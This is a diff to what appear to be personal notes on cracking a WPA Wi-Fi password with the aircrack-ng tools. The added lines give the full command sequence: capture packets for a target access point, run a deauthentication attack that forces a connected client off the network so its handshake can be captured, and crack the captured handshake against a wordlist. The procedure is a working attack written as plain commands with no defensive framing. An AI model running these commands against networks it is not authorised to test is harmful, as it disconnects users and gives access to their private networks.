@@ -7,7 +7,8 @@ STEP 1: Capture the handshake packets
 --> TERM1 # airmon-ng start wlan0
 --> TERM1 # airodump-ng [MonitorModeInterface]
 --> TERM1 # Ctl+c
---> TERM1 #
---> TERM1 #
---> TERM1 #
+--> TERM1 # airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <fileName_wpa_handshake> [MonitorModeInterface]
+--> TERM2 #  #aireplay-ng --deauth 4 -a <AP_MAC_address> -c <connected_Client_STATION_mac> [MonitorModeInterface] //perform a de-authentication attack to disconnect the client so that a handshake can be captured when client automatically attempt to connect to the network.
+Once we have the handshake "WPA handshake : xxxxxxxxx" mesage in TERM1. stop the capture CTL+c
+--> TERM1 # aircrack-ng  <fileName_wpa_handshake.cap> -w <wordList>
 
